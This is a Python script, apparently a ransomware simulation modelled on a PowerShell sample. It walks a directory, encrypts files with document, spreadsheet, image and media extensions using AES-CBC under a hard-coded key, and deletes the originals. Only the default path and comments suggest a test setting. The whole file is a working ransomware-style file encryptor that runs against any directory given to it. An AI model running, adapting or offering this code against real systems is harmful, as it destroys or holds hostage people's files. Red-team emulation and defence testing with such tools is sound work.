#!/usr/bin/env python3

import os
import argparse
import logging
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64
import sys

def generate_key(password: str) -> bytes:
    """Generate an AES key from a password."""
    # Using a fixed key for testing (similar to PowerShell script)
    key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
    return base64.b64decode(key)

def encrypt_file(file_path: str, key: bytes) -> bool:
    """Encrypt a single file using AES."""
    try:
        # Read the original file
        with open(file_path, 'rb') as file:
            file_data = file.read()
        
        # Create an initialization vector
        iv = os.urandom(16)
        
        # Create AES cipher
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        
        # Add padding
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(file_data) + padder.finalize()
        
        # Encrypt the data
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        # Write the encrypted data to a new file
        encrypted_path = f"{file_path}.encrypted"
        with open(encrypted_path, 'wb') as file:
            # Write IV first, then encrypted data
            file.write(iv)
            file.write(encrypted_data)
        
        # Remove the original file
        os.remove(file_path)
        
        return True
        
    except Exception as e:
        logging.error(f"Failed to encrypt {file_path}: {str(e)}")
        return False

def encrypt_directory(base_dir: str, password: str):
    """Encrypt all files in the specified directory."""
    try:
        # Generate encryption key
        key = generate_key(password)
        
        # Define target file extensions (same as PowerShell script)
        target_extensions = [
            '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.doc', '.docx', 
            '.rtf', '.txt', '.csv', '.jpg', '.jpeg', '.png', '.gif',
            '.avi', '.midi', '.mov', '.mp3', '.mp4', '.mpeg', '.mpg', '.ogg'
        ]
        
        # Get list of files to encrypt
        files = []
        for root, _, filenames in os.walk(base_dir):
            for filename in filenames:
                if any(filename.lower().endswith(ext) for ext in target_extensions) and \
                   not filename.endswith('.encrypted'):
                    files.append(os.path.join(root, filename))
        
        total_files = len(files)
        
        if total_files == 0:
            logging.info("No files found to encrypt")
            return
        
        logging.info(f"Found {total_files} files to encrypt")
        
        # Track progress
        successful = 0
        failed = 0
        
        # Process each file
        for i, file_path in enumerate(files, 1):
            logging.info(f"Encrypting {file_path}")
            
            if encrypt_file(file_path, key):
                successful += 1
            else:
                failed += 1
            
            # Log progress every 100 files or at the end
            if i % 100 == 0 or i == total_files:
                logging.info(f"Processed {i}/{total_files} files...")
        
        # Log final results
        logging.info("Encryption complete!")
        logging.info(f"Successfully encrypted: {successful} files")
        if failed > 0:
            logging.warning(f"Failed to encrypt: {failed} files")
            
    except Exception as e:
        logging.error(f"Encryption failed: {str(e)}")
        raise

def main():
    parser = argparse.ArgumentParser(description="Encrypt files in directory")
    parser.add_argument("--base_dir", default="~/encryption_test", 
                       help="Base directory containing files to encrypt (default: ~/encryption_test)")
    parser.add_argument("--password", required=True,
                       help="Password for encryption")
    args = parser.parse_args()
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Expand user path (~/...)
    base_dir = os.path.expanduser(args.base_dir)
    
    # Verify directory exists
    if not os.path.isdir(base_dir):
        logging.error(f"Directory not found: {base_dir}")
        sys.exit(1)
    
    encrypt_directory(base_dir, args.password)

if __name__ == "__main__":
    main() 